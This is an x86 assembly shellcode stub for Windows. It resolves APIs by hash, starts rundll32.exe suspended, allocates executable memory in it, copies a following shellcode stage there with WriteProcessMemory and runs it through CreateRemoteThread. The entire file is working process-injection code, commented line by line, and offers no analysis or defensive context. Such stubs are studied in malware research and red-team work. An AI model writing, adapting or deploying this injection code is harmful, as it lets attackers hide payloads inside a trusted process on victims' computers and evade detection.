;-----------------------------------------------------------------------------;
; Author: agix (florian.gaultier[at]gmail[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Size: 307 bytes
;-----------------------------------------------------------------------------;

[BITS 32]
; Input: EBP must be the address of 'api_call'.

xor edi, edi
push 0x00000004 ;PAGE_READWRITE
push 0x00001000 ;MEM_COMMIT
push 0x00000054 ;STARTUPINFO+PROCESS_INFORMATION
push edi 
push 0xE553A458 ;call VirtualAlloc() 
call ebp

mov dword [eax], 0x44
lea esi, [eax+0x44]
push edi
push 0x6578652e
push 0x32336c6c
push 0x646e7572
mov ecx, esp	;"rundll32.exe"
push esi		;lpProcessInformation
push eax		;lpStartupInfo
push edi		;lpCurrentDirectory
push edi		;lpEnvironment
push 0x00000044	;dwCreationFlags
push edi		;bInheritHandles
push edi		;lpThreadAttributes
push edi		;lpProcessAttributes
push ecx		;lpCommandLine
push edi		;lpApplicationName
push 0x863FCC79
call ebp 		;call CreatProcessA()

mov ecx, [esi]
push 0x00000040 ;PAGE_EXECUTE_READWRITE
push 0x00001000 ;MEM_COMMIT
push 0x00001000	;Next Shellcode Size
push edi
push ecx		;hProcess
push 0x3F9287AE ;call VirtualAllocEx()
call ebp

call me2
me2:
pop edx

mov edi, eax
mov ecx, [esi]
add dword edx, 0x112247   ;pointer on the next shellcode
push esp
push 0x00001000	;Next Shellcode Size
push edx		;
push eax		;lBaseAddress
push ecx		;hProcess
push 0xE7BDD8C5
call ebp 		;call WriteProcessMemory()

xor eax, eax
mov ecx, [esi]
push eax		;lpThreadId
push eax		;dwCreationFlags
push eax		;lpParameter
push edi		;lpStartAddress
push eax		;dwStackSize
push eax		;lpThreadAttributes
push ecx		;hProcess
push 0x799AACC6
call ebp 		;call CreateRemoteThread()

mov ecx, [esi]
push ecx
push 0x528796C6
call ebp 		;call CloseHandle()

mov ecx, [esi+0x4]
push ecx
push 0x528796C6
call ebp 		;call CloseHandle()